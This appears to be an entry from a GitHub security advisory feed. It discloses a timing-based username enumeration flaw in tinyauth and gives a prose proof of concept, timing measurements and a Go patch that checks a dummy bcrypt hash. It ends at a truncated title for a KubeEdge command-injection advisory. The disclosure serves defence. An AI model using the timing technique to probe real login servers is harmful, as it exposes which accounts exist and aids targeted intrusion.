-        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
-<p>It's possible to enumerate users through a timing oracle. In other words: I can easily check if a username exists or not by observing the timing differences between logins.</p>
-<h3 id="poc">PoC</h3>
-<p>Setup a tinyauth server with a local user. It can be over the network.</p>
-<p>Try to log in with the local user, using an incorrect password: there is a noticeable delay. You know that the user exists.</p>
-<p>Now try to log in with a username that does not exist, using an incorrect password: it will complete almost immediately. You know that the user does not exist.</p>
-<h3 id="expected-vs-actual-behavior">Expected vs actual behavior</h3>
-<p>Login attempts should take roughly the same amount of time when the user exists vs when the user does not exist.
-Right now, nonexistent user attempts are way faster, meaning if your login attempt is slow, then the username exists for sure.</p>
-<h3 id="details">Details</h3>
-<p>Existing usernames will take an extra ~50 milliseconds to respond to login attempts, while non-existing usernames will take only ~50 microseconds (1000x less time) to return an incorrect password response.</p>
-<p>Even taking network traffic into consideration, it is trivial to check whether a local user exists or not.</p>
-<p>=== Existing user, wrong password ===
-  #1: 50.52ms
-  #2: 46.24ms
-  #3: 43.57ms</p>
-<p>=== Nonexistent user ===
-  #1: 43.03µs
-  #2: 48.45µs
-  #3: 59.33µs</p>
-<h3 id="suggested-fix">Suggested fix</h3>
-<p>This can be solved by checking a dummy password hash when a user is not found before returning a query, this will mimic the exact same delay irrelevant of hardware capabilities.</p>
-<p>Potential patch:</p>
-<pre><code>From ca102773e0303f6025480efb26db379e3570a350 Mon Sep 17 00:00:00 2001
-From: Disyer &lt;daniel@tohka.us&gt;
-Date: Tue, 14 Jul 2026 12:35:07 +0300
-Subject: [PATCH] fix: prevent user enumeration by means of timing attack
-
----
- internal/controller/user_controller.go    |  1 +
- internal/middleware/context_middleware.go |  1 +
- internal/service/auth_service.go          | 10 ++++++++++
- 3 files changed, 12 insertions(+)
-
-diff --git a/internal/controller/user_controller.go b/internal/controller/user_controller.go
-index ae6c23b..2ecc996 100644
---- a/internal/controller/user_controller.go
-+++ b/internal/controller/user_controller.go
-@@ -90,6 +90,7 @@ func (controller *UserController) loginHandler(c *gin.Context) {
- 
-        if err != nil {
-                if errors.Is(err, service.ErrUserNotFound) {
-+                       controller.auth.DummyCheckPassword(req.Password)
-                        controller.log.App.Warn().Str("username", req.Username).Msg("User not found during login attempt")
-                        controller.auth.RecordLoginAttempt(req.Username, false)
-                        controller.log.AuditLoginFailure(req.Username, "unknown", c.ClientIP(), "user not found")
-diff --git a/internal/middleware/context_middleware.go b/internal/middleware/context_middleware.go
-index f49c85a..f70c9e7 100644
---- a/internal/middleware/context_middleware.go
-+++ b/internal/middleware/context_middleware.go
-@@ -244,6 +244,7 @@ func (m *ContextMiddleware) basicAuth(username string, password string) (*model.
-        search, err := m.auth.SearchUser(username)
- 
-        if err != nil {
-+               m.auth.DummyCheckPassword(password)
-                return nil, nil, fmt.Errorf("error searching for user: %w", err)
-        }
- 
-diff --git a/internal/service/auth_service.go b/internal/service/auth_service.go
-index eeb5c8e..9cbc105 100644
---- a/internal/service/auth_service.go
-+++ b/internal/service/auth_service.go
-@@ -28,6 +28,10 @@ import (
- const MaxOAuthPendingSessions = 256
- const OAuthCleanupCount = 16
- 
-+// a dummy hash to check when a user is not found, to prevent user enumeration
-+// hardcoded to prevent having to generate a hash on every startup
-+const dummyHash = "$2a$10$iFQ6./j2a.UShYQOzWh4vOlnoze5DmHI3tRY3WU4YMj3zwp.t3TnO"
-+
- var (
-        ErrUserNotFound = errors.New("user not found")
- )
-@@ -204,6 +208,12 @@ func (auth *AuthService) CheckUserPassword(search model.UserSearch, password str
-        return errors.New("user authentication failed")
- }
- 
-+func (auth *AuthService) DummyCheckPassword(password string) {
-+       // When a user is not found, we still want to perform a password check to prevent
-+       // timing attacks that could reveal whether a user exists or not
-+       bcrypt.CompareHashAndPassword([]byte(dummyHash), []byte(password))
-+}
-+
- func (auth *AuthService) GetLocalUser(username string) *model.LocalUser {
-        if auth.runtime.LocalUsers == nil {
-                return nil
--- 
-2.55.0
-</code></pre>
-<p>After testing the proposed fix, there is no discernible timing difference:</p>
-<p>=== Existing user, wrong password ===
-  #1: 43.23ms
-  #2: 43.26ms
-  #3: 42.57ms</p>
-<p>=== Nonexistent user ===
-  #1: 42.45ms
-  #2: 42.11ms
-  #3: 47.71ms</p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/tinyauthapp/tinyauth/security/advisories/GHSA-456h-ww26-f758">https://github.com/tinyauthapp/tinyauth/security/advisories/GHSA-456h-ww26-f758</a></li>
-<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-77582">https://nvd.nist.gov/vuln/detail/CVE-2026-77582</a></li>
-<li><a href="https://github.com/tinyauthapp/tinyauth/pull/1004">https://github.com/tinyauthapp/tinyauth/pull/1004</a></li>
-<li><a href="https://github.com/tinyauthapp/tinyauth/commit/c22925c2fba981875d0a2b09dd3ee41c0ae4c310">https://github.com/tinyauthapp/tinyauth/commit/c22925c2fba981875d0a2b09dd3ee41c0ae4c310</a></li>
-<li><a href="https://github.com/tinyauthapp/tinyauth/releases/tag/v5.1.0">https://github.com/tinyauthapp/tinyauth/releases/tag/v5.1.0</a></li>
-<li><a href="https://github.com/advisories/GHSA-456h-ww26-f758">https://github.com/advisories/GHSA-456h-ww26-f758</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-456h-ww26-f758</uri>
-        </author>
-        <category label="severity" term="MODERATE"/>
-        <published>2026-09-22T20:37:06.000Z</published>
     </entry>
     <entry>
         <title type="html"><![CDATA[[github.com/kubeedge/kubeedge] KubeEdge: Command Injection in NodeUpgradeJob - RCE on edge nodes via v1alpha2 API]]></title>
